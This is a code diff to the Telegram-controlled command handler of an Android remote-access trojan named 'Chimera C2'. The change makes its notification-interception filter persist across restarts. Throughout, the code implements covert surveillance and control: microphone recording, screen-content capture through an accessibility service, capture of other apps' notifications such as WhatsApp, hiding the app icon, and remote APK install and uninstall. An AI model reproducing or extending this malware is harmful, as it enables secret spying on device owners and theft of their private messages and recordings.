@@ -4,6 +4,7 @@ import android.accessibilityservice.AccessibilityService;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.net.Uri;
@@ -31,13 +32,20 @@ public class TelegramBotWorker implements Runnable {
     private int customDuration = 0;
     private int customScale = 100;
 
+    public static final String NOTIFICATION_FILTER_PREF = "notification_filter_package";
+    private static String notificationFilterPackage = null;
+    private final Runnable activityCallback;
+
     public TelegramBotWorker(Context ctx, Runnable callback) {
         this.context = ctx.getApplicationContext();
         this.activityCallback = callback;
+        SharedPreferences prefs = context.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
+        notificationFilterPackage = prefs.getString(NOTIFICATION_FILTER_PREF, null);
     }
+    
+    // This getter is no longer used by NotificationListener but is kept for internal consistency
     public static String getNotificationFilter() { return notificationFilterPackage; }
-    private static String notificationFilterPackage = null;
-    private final Runnable activityCallback;
+
 
     @Override
     public void run() {
@@ -86,7 +94,7 @@ public class TelegramBotWorker implements Runnable {
             if (handleStatefulReply(text)) return;
 
             if ("/start".equals(text)) {
-                sendMainPanel(chatId, 0); // Send new panel message
+                sendMainPanel(chatId, 0);
             }
         } catch (Exception e) { ErrorLogger.logError(context, "HandleMessage", e); }
     }
@@ -94,7 +102,7 @@ public class TelegramBotWorker implements Runnable {
     private boolean handleStatefulReply(String text) {
         WaitingState previousState = currentState;
         if (previousState == WaitingState.NONE) return false;
-        currentState = WaitingState.NONE; // Reset state after handling
+        currentState = WaitingState.NONE;
 
         try {
             switch (previousState) {
@@ -125,18 +133,18 @@ public class TelegramBotWorker implements Runnable {
                     sendMessage("Ready for audio file. It will be played " + durationText, context);
                     return true;
                 default:
-                    currentState = previousState; // Not for this state, so revert
+                    currentState = previousState;
                     return false;
             }
         } catch (Exception e) {
             sendMessage("Invalid input. Please try the command again.", context);
-            return true; // We handled the state, even if it was an error.
+            return true;
         }
     }
 
     private void handleFileUpload(JSONObject msg) {
         WaitingState previousState = currentState;
-        currentState = WaitingState.NONE; // Always reset state after a file upload attempt
+        currentState = WaitingState.NONE;
         try {
             String fileId = "", fileName = "tempfile";
             if (msg.has("document")) { fileId = msg.getJSONObject("document").getString("file_id"); fileName = msg.getJSONObject("document").getString("file_name");
@@ -170,7 +178,6 @@ public class TelegramBotWorker implements Runnable {
             long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
             int messageId = cb.getJSONObject("message").getInt("message_id");
 
-            // Answer the callback to remove the "loading" state on the button
             answerCallbackQuery(cb.getString("id"));
 
             if (!ChimeraAccessibilityService.isServiceEnabled() && (data.startsWith("ACC_") || data.equals("SCREEN_OFF"))) {
@@ -179,7 +186,6 @@ public class TelegramBotWorker implements Runnable {
             }
 
             switch (data) {
-                // Panel Navigation
                 case "PANEL_MAIN": sendMainPanel(chatId, messageId); break;
                 case "PANEL_APPS": sendAppPanel(chatId, messageId); break;
                 case "PANEL_DEVICE": sendDeviceControlPanel(chatId, messageId); break;
@@ -188,22 +194,16 @@ public class TelegramBotWorker implements Runnable {
                 case "PANEL_NOTIFS": sendNotificationPanel(chatId, messageId); break;
                 case "PANEL_GESTURES": sendGesturePanel(chatId, messageId); break;
                 case "PANEL_HELP": sendHelpPanel(chatId, messageId); break;
-
-                // App Management Actions
                 case "ACTION_LIST_APPS": listAllApps(); break;
                 case "ACTION_LAUNCH_APP": promptForState(WaitingState.FOR_PACKAGE_NAME_LAUNCH, "Reply with the package name to launch."); break;
                 case "ACTION_UNINSTALL_APP": promptForState(WaitingState.FOR_PACKAGE_NAME_UNINSTALL, "Reply with the package name to uninstall."); break;
                 case "ACTION_INSTALL_APP": promptForState(WaitingState.FOR_APK_INSTALL, "Upload the APK file to install."); break;
-
-                // Device Control Actions
                 case "ACTION_SET_VOLUME": promptForState(WaitingState.FOR_VOLUME, "Reply with a volume level from 0 to 100."); break;
                 case "ACTION_SCREEN_ON": context.startActivity(new Intent(context, WakeActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); break;
                 case "ACTION_SCREEN_OFF": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN); break;
                 case "ACTION_FLASHLIGHT_ON": DeviceControlHandler.setFlashlightState(context, true); break;
                 case "ACTION_FLASHLIGHT_OFF": DeviceControlHandler.setFlashlightState(context, false); break;
                 case "ACTION_GET_DETAILS": DeviceDetailsHelper.getDeviceDetails(context, details -> sendMessage(details, context)); break;
-
-                // Media Actions
                 case "ACTION_MIC_30": handleMicRecording(30); break;
                 case "ACTION_MIC_60": handleMicRecording(60); break;
                 case "ACTION_MIC_CUSTOM": promptForState(WaitingState.FOR_MIC_DURATION, "Reply with the recording duration in seconds."); break;
@@ -212,8 +212,6 @@ public class TelegramBotWorker implements Runnable {
                 case "ACTION_SHOW_IMAGE": promptForState(WaitingState.FOR_IMAGE_PARAMS, "Reply with duration and scale (e.g., `15 80` for 15s at 80% scale). Default is `10 100`."); break;
                 case "ACTION_PLAY_AUDIO": promptForState(WaitingState.FOR_AUDIO_PARAMS, "Reply with duration in seconds, or `full` to play the entire file."); break;
                 case "ACTION_OPEN_LINK": promptForState(WaitingState.FOR_LINK_OPEN, "Reply with the full URL to open (e.g., https://google.com)"); break;
-
-                // System & Services Actions
                 case "ACTION_HIDE_ICON_ON": DeviceControlHandler.setComponentState(context, false); sendMessage("App icon is now hidden.", context); break;
                 case "ACTION_HIDE_ICON_OFF": DeviceControlHandler.setComponentState(context, true); sendMessage("App icon is now visible.", context); break;
                 case "ACTION_GET_CONTENT": sendMessage(ChimeraAccessibilityService.getScreenContent(), context); break;
@@ -226,23 +224,17 @@ public class TelegramBotWorker implements Runnable {
                     context.stopService(new Intent(context, TelegramC2Service.class));
                     break;
                 case "ACTION_EXIT_PANEL": editMessage(chatId, messageId, "Control panel closed."); break;
-
-                // Notification Actions
                 case "NOTIF_GET_EXISTING": context.sendBroadcast(new Intent("com.chimera.GET_ACTIVE_NOTIFICATIONS")); break;
                 case "NOTIF_SET_FILTER": promptForState(WaitingState.FOR_NOTIFICATION_FILTER, "Reply with the package name to filter notifications for (e.g., com.whatsapp)."); break;
                 case "NOTIF_CLEAR_FILTER": setNotificationFilter(null); break;
                 case "NOTIF_ENABLE": setNotificationListenerState(true); break;
                 case "NOTIF_DISABLE": setNotificationListenerState(false); break;
-
-                // Gesture Actions
                 case "ACC_ACTION_BACK": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK); break;
                 case "ACC_ACTION_HOME": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME); break;
                 case "ACC_ACTION_RECENTS": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS); break;
             }
         } catch (Exception e) { ErrorLogger.logError(context, "HandleCallback", e); }
     }
-    
-    // --- Panel Creation Methods ---
 
     private void sendMainPanel(long chatId, int messageId) {
         String text = "`Chimera C2` | Main Menu";
@@ -254,9 +246,9 @@ public class TelegramBotWorker implements Runnable {
             rows.put(new JSONArray().put(createButton("ℹ️ Help", "PANEL_HELP")).put(createButton("❌ Close Panel", "ACTION_EXIT_PANEL")));
             keyboard.put("inline_keyboard", rows);
 
-            if (messageId == 0) { // New message
+            if (messageId == 0) {
                 sendMessageWithMarkup(text, keyboard);
-            } else { // Edit existing message
+            } else {
                 editMessageMarkup(chatId, messageId, text, keyboard);
             }
         } catch (Exception e) { ErrorLogger.logError(context, "SendMainPanel", e); }
@@ -364,8 +356,6 @@ public class TelegramBotWorker implements Runnable {
         } catch (Exception e) { ErrorLogger.logError(context, "SendHelpPanel", e); }
     }
 
-    // --- Action Handler Methods ---
-
     private void promptForState(WaitingState state, String message) {
         currentState = state;
         sendMessage(message, context);
@@ -448,7 +438,10 @@ public class TelegramBotWorker implements Runnable {
     }
 
     private void setNotificationFilter(String packageName) {
+        SharedPreferences prefs = context.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
+        prefs.edit().putString(NOTIFICATION_FILTER_PREF, packageName).apply();
         notificationFilterPackage = packageName;
+
         if (packageName == null || packageName.isEmpty()) {
             sendMessage("Notification filter cleared. Capturing from all apps.", context);
         } else {
@@ -485,8 +478,6 @@ public class TelegramBotWorker implements Runnable {
             }
         }).start();
     }
-
-    // --- Telegram API Helper Methods ---
 
     private JSONObject createButton(String text, String callbackData) throws org.json.JSONException {
         return new JSONObject().put("text", text).put("callback_data", callbackData);
